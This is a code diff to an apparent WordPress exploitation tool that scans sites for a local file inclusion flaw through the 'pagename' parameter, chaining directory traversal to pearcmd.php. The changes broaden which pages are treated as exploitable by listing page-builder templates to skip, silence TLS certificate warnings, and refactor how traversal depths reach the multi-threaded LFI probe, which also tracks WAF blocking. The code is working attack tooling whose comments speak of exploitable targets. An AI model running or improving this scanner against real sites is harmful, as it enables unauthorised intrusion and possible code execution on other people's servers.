@@ -30,8 +30,11 @@ from typing import Optional
 from xml.etree import ElementTree
 
 import requests
+import urllib3
 from requests.adapters import HTTPAdapter
 from urllib3.util.retry import Retry
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # ---------------------------------------------------------------------------
 # Constants
@@ -121,11 +124,28 @@ LITESPEED_403_INDICATORS: list[str] = [
     "lsws",
 ]
 
-ELEMENTOR_TEMPLATES: list[str] = [
+# Builder templates that intercept WordPress template loading BEFORE locate_template()
+# is called — pages using these are NOT exploitable via the pagename LFI vector.
+# Theme-specific custom templates (e.g. "full-width", "no-sidebar") are NOT listed
+# here because they still go through locate_template() normally.
+KNOWN_BUILDER_TEMPLATES: list[str] = [
+    # Elementor
     "elementor_header_footer",
-    "elementor",
+    "elementor_canvas",
     "elementor-canvas",
     "elementor-full-width",
+    "elementor",
+    # Divi
+    "page-template-blank",
+    "et_full_width_page",
+    # Beaver Builder
+    "fl-builder-template",
+    # WPBakery
+    "vc_empty_page",
+    # Oxygen
+    "oxygen-blank-template",
+    # Bricks
+    "bricks-template",
 ]
 
 DEFAULT_TIMEOUT: int = 15
@@ -587,16 +607,25 @@ def discover_pages(session: requests.Session, base: str, thorough: bool,
 # ---------------------------------------------------------------------------
 
 def filter_exploitable_pages(pages: list[PageInfo], verbose: bool) -> list[PageInfo]:
+    """
+    Keep pages that go through locate_template() normally.
+    Skip only known page-builder templates that intercept template loading
+    before locate_template() is reached. Theme-specific custom templates
+    (e.g. "full-width.php", "no-sidebar.php") are still exploitable.
+    """
     exploitable = []
     for p in pages:
         tmpl = p.template.strip().lower()
-        if tmpl in ("", "default"):
-            exploitable.append(p)
-        else:
+        # strip .php suffix for comparison
+        tmpl_base = tmpl.replace(".php", "")
+        is_builder = any(bt in tmpl_base for bt in KNOWN_BUILDER_TEMPLATES)
+        if is_builder:
             if verbose:
-                print(f"  [-] Skipping page {p.page_id} ({p.slug}): template={p.template}")
+                print(f"  [-] Skipping page {p.page_id} ({p.slug}): builder template={p.template}")
+        else:
+            exploitable.append(p)
     if verbose:
-        print(f"  [*] Exploitable pages (default template): {len(exploitable)}")
+        print(f"  [*] Exploitable pages: {len(exploitable)} / {len(pages)}")
     return exploitable
 
 
@@ -641,18 +670,21 @@ def _lfi_probe_single(session: requests.Session, base: str, page: PageInfo,
 
 
 def scan_lfi(session: requests.Session, base: str, pages: list[PageInfo],
-             themes: list[ThemeInfo], port: int, threads: int, verbose: bool) -> Optional[LFIResult]:
+             themes: list[ThemeInfo], port: int, threads: int, verbose: bool,
+             depths: Optional[list] = None) -> Optional[LFIResult]:
+    if depths is None:
+        depths = TRAVERSAL_DEPTHS
     tasks = []
     for page in pages:
         for theme in themes:
-            for depth in TRAVERSAL_DEPTHS:
+            for depth in depths:
                 for ppath in PEARCMD_PATHS:
                     tasks.append((page, theme, depth, ppath))
 
     if verbose:
         print(f"  [*] LFI combos: {len(tasks)} "
               f"({len(pages)} pages x {len(themes)} themes x "
-              f"{len(TRAVERSAL_DEPTHS)} depths x {len(PEARCMD_PATHS)} pearcmd paths)")
+              f"{len(depths)} depths x {len(PEARCMD_PATHS)} pearcmd paths)")
 
     waf_result: Optional[LFIResult] = None
     confirmed_result: Optional[LFIResult] = None
@@ -946,27 +978,19 @@ def main():
             print(f"\n[Phase 4] Template validation ({len(pages)} pages)")
         exploitable_pages = filter_exploitable_pages(pages, args.verbose or (not args.json))
 
-    # depth override
+    # depth override — make a copy so we never mutate the global list
     if args.depth:
         scan_depths = [args.depth]
     else:
-        scan_depths = TRAVERSAL_DEPTHS
-
-    # temporarily replace TRAVERSAL_DEPTHS for scan
-    original_depths = TRAVERSAL_DEPTHS[:]
-    TRAVERSAL_DEPTHS.clear()
-    TRAVERSAL_DEPTHS.extend(scan_depths)
+        scan_depths = TRAVERSAL_DEPTHS[:]  # copy, not reference
 
     # Phase 5: LFI scan
     if not args.json:
         print("\n[Phase 5] LFI probe")
     lfi_result = scan_lfi(session, target, exploitable_pages, themes,
-                          args.port, args.threads, args.verbose or (not args.json))
+                          args.port, args.threads, args.verbose or (not args.json),
+                          depths=scan_depths)
     result.lfi = lfi_result
-
-    # restore
-    TRAVERSAL_DEPTHS.clear()
-    TRAVERSAL_DEPTHS.extend(original_depths)
 
     if lfi_result and lfi_result.waf_blocked:
         result.waf_detected = True
